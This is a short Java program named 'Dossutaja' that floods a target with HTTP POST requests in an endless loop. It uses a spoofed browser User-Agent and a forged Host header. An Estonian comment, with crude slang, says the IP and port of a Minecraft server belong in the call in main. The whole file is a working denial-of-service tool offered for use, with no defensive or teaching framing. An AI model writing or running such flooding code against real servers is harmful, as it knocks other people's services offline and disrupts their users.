package pedekas;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class Dossutaja {
    public static void main(String[] args) throws IOException {
        attack("", 6000); // SIIA LÄHEB MINECRAFTI POISTE IP JA PORT tra
    }


    public static void attack(String ip, int port) throws IOException {
        URL url = new URL("http", ip, port, "nahhujaa.txt");
        while (true) {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            System.out.println(connection.getResponseCode());
            connection.getInputStream();
        }
    }
}
